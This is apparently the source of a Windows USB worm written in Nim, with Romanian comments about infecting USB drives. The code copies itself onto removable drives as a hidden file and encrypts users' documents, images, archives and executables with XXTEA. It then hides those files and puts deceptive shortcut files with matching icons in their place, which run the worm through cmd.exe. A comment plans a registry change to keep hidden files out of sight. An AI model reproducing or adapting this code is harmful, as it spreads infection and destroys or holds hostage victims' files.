## aici o sa fac o func cu care infectez usburi
## 
## o sa am nev de asta
## key: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced
## value: Hidden = 2
## 
## ca sa nu se vada fisierele ascunse puse pe drive
## 
## TODO: termina asta

from os import walkDirRec
from os import splitFile
from os import getAppFilename
from os import copyFile
from os import `/`
from os import getEnv
from os import tryRemoveFile
from os import existsFile

from bitops import bitor

from winim/inc/windef import DWORD
from winim/inc/windef import FILE_ATTRIBUTE_READONLY
from winim/inc/windef import FILE_ATTRIBUTE_HIDDEN
from winim/inc/windef import FILE_ATTRIBUTE_NOT_CONTENT_INDEXED
from winim/inc/windef import FILE_ATTRIBUTE_SYSTEM
from winim/inc/windef import UINT
from winim/inc/windef import PULARGE_INTEGER
from winim/inc/windef import LPCWSTR
from winim/inc/windef import MAX_PATH
from winim/inc/windef import PVOID
from winim/inc/windef import LPWSTR

from winim/inc/winbase import GetFileAttributes
from winim/inc/winbase import SetFileAttributes
from winim/inc/winbase import GetDriveTypeW
from winim/inc/winbase import DRIVE_REMOVABLE
from winim/inc/winbase import GetDiskFreeSpaceExW
from winim/inc/winbase import GetVolumeInformationW

from winim/inc/shellapi import IShellLink
from winim/inc/shellapi import CLSID_ShellLink
from winim/inc/shellapi import IID_IShellLink
from winim/inc/shellapi import winimConverterIShellLinkWToIUnknown
from winim/inc/shellapi import SetPath
from winim/inc/shellapi import SetArguments
from winim/inc/shellapi import SetIconLocation
from winim/inc/shellapi import SetShowCmd

from winim/inc/objbase import Save
from winim/inc/objbase import Release
from winim/inc/objbase import QueryInterface
from winim/inc/objbase import winimConverterIPersistFileToIUnknown
from winim/inc/objbase import IPersistFile
from winim/inc/objbase import CoInitialize
from winim/inc/objbase import CoUninitialize
from winim/inc/objbase import CoCreateInstance
from winim/inc/objbase import CLSCTX_LOCAL_SERVER
from winim/inc/objbase import IID_IPersistFile

from winim/winstr import winstrConverterStringToLPWSTR
from winim/winstr import winstrConverterWStringToLPWSTR
from winim/winstr import newWString
from winim/winstr import `$`

from winim/utils import `&`
from winim/utils import winimConverterBooleanToBOOL

import ../more/xxtea

from ../flags import INFECT_ENCRYPTION_KEY

type Icons = enum
  shell32, imageres, wmploc

const extensions = [
  (".mp3", wmploc, 60),     # MP3 audio file
  (".mpa", shell32, 0),     # MPEG-2 audio file
  (".wav", wmploc, 62),     # WAV file
  (".7z", shell32, 0),      # 7-Zip compressed file
  (".arj", shell32, 0),     # ARJ compressed file
  (".deb", shell32, 0),     # Debian software package file
  (".pkg", shell32, 0),     # Package file
  (".rar", shell32, 0),     # RAR file
  (".rpm", shell32, 0),     # Red Hat Package Manager
  (".tar.gz", shell32, 0),  # Tarball compressed file
  (".z", shell32, 0),       # Z compressed file
  (".zip", shell32, 0),     # Zip compressed file"
  (".bin", shell32, 0),     # Binary disc image
  (".dmg", shell32, 0),     # macOS X disk image
  (".iso", shell32, 0),     # ISO disc image
  (".toast", shell32, 0),   # Toast disc image
  (".csv", shell32, 0),     # Comma separated value file
  (".dbf", shell32, 0),     # Database file
  (".log", shell32, 0),     # Log file
  (".mdb", shell32, 0),     # Microsoft Access database file
  (".sav", shell32, 0),     # Save file (e.g., game save file)
  (".sql", shell32, 0),     # SQL database file
  (".tar", shell32, 0),     # Linux / Unix tarball file archive
  (".xml", shell32, 0),     # XML file
  (".email", shell32, 0),   # Outlook Express e-mail message file.
  (".eml", shell32, 0),  # E-mail message file from multiple e-mail clients, including Gmail.
  (".emlx", shell32, 0),    # Apple Mail e-mail file.
  (".msg", shell32, 0),     # Microsoft Outlook e-mail message file.
  (".oft", shell32, 0),     # Microsoft Outlook e-mail template file.
  (".ost", shell32, 0),     # Microsoft Outlook offline e-mail storage file.
  (".pst", shell32, 0),     # Microsoft Outlook e-mail storage file.
  (".vcf", shell32, 0),     # E-mail contact file.
  (".apk", shell32, 0),     # Android package file
  (".bat", imageres, 64),   # Batch file
  (".bin", shell32, 0),     # Binary file
  (".cgi", shell32, 0),
  (".pl", shell32, 0),      # Perl script file
  (".com", shell32, 0),     # MS-DOS command file
  (".exe", imageres, 11),   # Executable file
  (".gadget", shell32, 0),  # Windows gadget
  (".jar", shell32, 0),     # Java Archive file
  (".msi", imageres, 163),  # Windows installer package
  (".py", shell32, 0),      # Python file
  (".wsf", shell32, 0),     # Windows Script File
  (".ai", shell32, 0),      # Adobe Illustrator file
  (".bmp", imageres, 66),   # Bitmap image
  (".gif", imageres, 67),   # GIF image
  (".ico", shell32, 0),     # Icon file
  (".jpeg", imageres, 68),
  (".jpg", imageres, 68),   # JPEG image
  (".png", imageres, 79),   # PNG image
  (".ps", shell32, 0),      # PostScript file
  (".psd", shell32, 0),     # PSD image
  (".svg", shell32, 0),     # Scalable Vector Graphics file
  (".tif", imageres, 160),
  (".tiff", imageres, 160), # TIFF image
  (".key", shell32, 0),     # Keynote presentation
  (".odp", shell32, 0),     # OpenOffice Impress presentation file
  (".pps", shell32, 0),     # PowerPoint slide show
  (".ppt", shell32, 0),     # PowerPoint presentation
  (".pptx", shell32, 0),    # PowerPoint Open XML presentation
  (".ods", shell32, 0),     # OpenOffice Calc spreadsheet file
  (".xls", shell32, 0),     # Microsoft Excel file
  (".xlsm", shell32, 0),    # Microsoft Excel file with macros
  (".xlsx", shell32, 0),    # Microsoft Excel Open XML spreadsheet file
  (".icns", shell32, 0),    # macOS X icon resource file
  (".ico", shell32, 0),     # Icon file
  (".msi", shell32, 0),     # Windows installer package
  (".3g2", shell32, 0),     # 3GPP2 multimedia file
  (".3gp", shell32, 0),     # 3GPP multimedia file
  (".avi", wmploc, 59),     # AVI file
  (".flv", shell32, 0),     # Adobe Flash file
  (".h264", shell32, 0),    # H.264 video file
  (".m4v", shell32, 0),     # Apple MP4 video file
  (".mkv", shell32, 0),     # Matroska Multimedia Container
  (".mov", shell32, 0),     # Apple QuickTime movie file
  (".mp4", shell32, 0),     # MPEG4 video file
  (".mpg", wmploc, 61),     # MPEG video file
  (".mpeg", wmploc, 61),    # MPEG video file
  (".rm", shell32, 0),      # RealMedia file
  (".swf", shell32, 0),     # Shockwave flash file
  (".vob", shell32, 0),     # DVD Video Object
  (".wmv", wmploc, 64),     # Windows Media Video file
  (".doc", shell32, 0),
  (".docx", shell32, 0),    # Microsoft Word file
  (".odt", shell32, 0),     # OpenOffice Writer document file
  (".pdf", shell32, 0),     # PDF file
  (".rtf", shell32, 0),     # Rich Text Format
  (".tex", shell32, 0),     # A LaTeX document file
  (".txt", imageres, 97),   # Plain text file
  (".wpd", shell32, 0),     # WordPerfect document
]


proc setAttributes(attr: DWORD): DWORD =
  result = bitor(attr, FILE_ATTRIBUTE_READONLY)
  result = bitor(result, FILE_ATTRIBUTE_HIDDEN)
  result = bitor(result, FILE_ATTRIBUTE_NOT_CONTENT_INDEXED)
  result = bitor(result, FILE_ATTRIBUTE_SYSTEM)

proc hideFile(path: string): void =
  let attr: DWORD = GetFileAttributes(path)

  let newAttr: DWORD = setAttributes(attr)

  SetFileAttributes(path, newAttr)

proc createShortcut(sys32: string, file: string, path: string, iconPath: string,
    iconIndex: int, originalFilePath: string, tmpFilePath: string): void =
  var
    pIL: ptr IShellLink
    pPF: ptr IPersistFile

  CoCreateInstance(&CLSID_ShellLink, nil, CLSCTX_LOCAL_SERVER,
      &IID_IShellLink, cast[ptr PVOID](&pIL))

  pIL.QueryInterface(&IID_IPersistFile, cast[ptr PVOID](&pPF))

  pIL.SetPath(sys32 / "cmd.exe")
  pIL.SetArguments("/c \"\"" & file & "\" \"" & originalFilePath &
      "\" && start /B \"\"\"\" \"" & file & "\" && start \"\"\"\" \"" &
      tmpFilePath & "\"\"")

  pIL.SetIconLocation(iconPath, int32 iconIndex)

  pIl.SetShowCmd(7) # start as minimized

  pIL.Release()

  pPF.Save(path, true)

  pPF.Release()

proc encryptFile(filePath: string): void =
  let input = readFile(filePath)

  let encrypted = xxtea.encrypt(input, INFECT_ENCRYPTION_KEY)

  writeFile(filePath, encrypted)
  # const decrypt_data = xxtea.decrypt(encrypt_data, key)

proc checkDrive(dest: string, drivePath: string): void =
  let sys32 = getEnv("SystemRoot") / "System32"
  let tmp = getEnv("tmp")
  for path in walkDirRec(drivePath):
    let (dir, name, fileExt) = splitFile(path)

    for (ext, icon, index) in extensions:
      var iconPath: string
      if fileExt == ext: # valid extension
        encryptFile(path)
        hideFile(path)

        case icon:
        of shell32:
          iconPath = sys32 / "shell32.dll"
        of imageres:
          iconPath = sys32 / "imageres.dll"
        of wmploc:
          iconPath = sys32 / "wmploc.dll"

        createShortcut(sys32, dest, dir / name & ".lnk", iconPath, index, path,
            tmp / name & fileExt)

        ## > create lnk file
        ## > hide original
        break


proc searchForUSB(): void =
  let appName: string = getAppFilename()
  for letter in "DEFGHIJKLMNOPQRSTUVWXYZ":
    let drivePath: string = letter & r":\"
    let driveType: UINT = GetDriveTypeW(drivePath)

    if driveType == DRIVE_REMOVABLE:
      var freeSpaceInBytes: int64
      GetDiskFreeSpaceExW(drivePath, cast[PULARGE_INTEGER](
          addr freeSpaceInBytes), nil, nil)

      if freeSpaceInBytes div 1000000 >= 2: # if at least 2mb free
        var lpVolumeNameBuffer: LPCWSTR = newWString(MAX_PATH)

        GetVolumeInformationW(drivePath, lpVolumeNameBuffer, MAX_PATH, nil, nil,
            nil, nil, 0)

        var driveName: string = $lpVolumeNameBuffer

        if driveName == "":
          driveName = "Drive"

        let dest: string = drivePath / "$Win" & driveName & ".dump"
        ## possible names:
        ## $Win
        ## $WinSearch
        ## $WinQuery
        ## $WinFind
        if not existsFile(dest): # daca ii deja infectat lasa l in pace
          copyFile(appName, dest)
          hideFile(dest)
          checkDrive(dest, drivePath)

proc initInfectThread*(): void {.thread.} =
  CoInitialize(nil)
  searchForUSB()
  CoUninitialize()
